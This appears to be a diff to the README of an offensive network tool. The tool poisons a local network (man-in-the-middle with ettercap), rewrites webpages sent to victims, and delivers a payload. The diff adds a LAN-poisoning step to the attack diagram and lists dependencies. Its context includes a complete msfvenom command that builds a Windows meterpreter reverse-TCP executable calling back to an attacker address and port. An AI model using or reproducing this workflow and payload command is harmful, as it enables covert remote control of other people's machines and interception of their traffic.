@@ -22,10 +22,13 @@
     back to the host that have request for it (tcp/ip hijacking)
 
     Diagram:
-     1º - target requests webpage
-     2º - attacker modifies webpage response
-     3º - modified packet forward back to target
+     1º - poison local lan (mitm)
+     2º - target requests webpage
+     3º - attacker modifies webpage response
+     4º - modified packet forward back to target
 
+# Dependencies
+    ettercap, zenity
 
 # Build msfvenom binary
     sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.67 LPORT=666 -f exe -o payload.exe
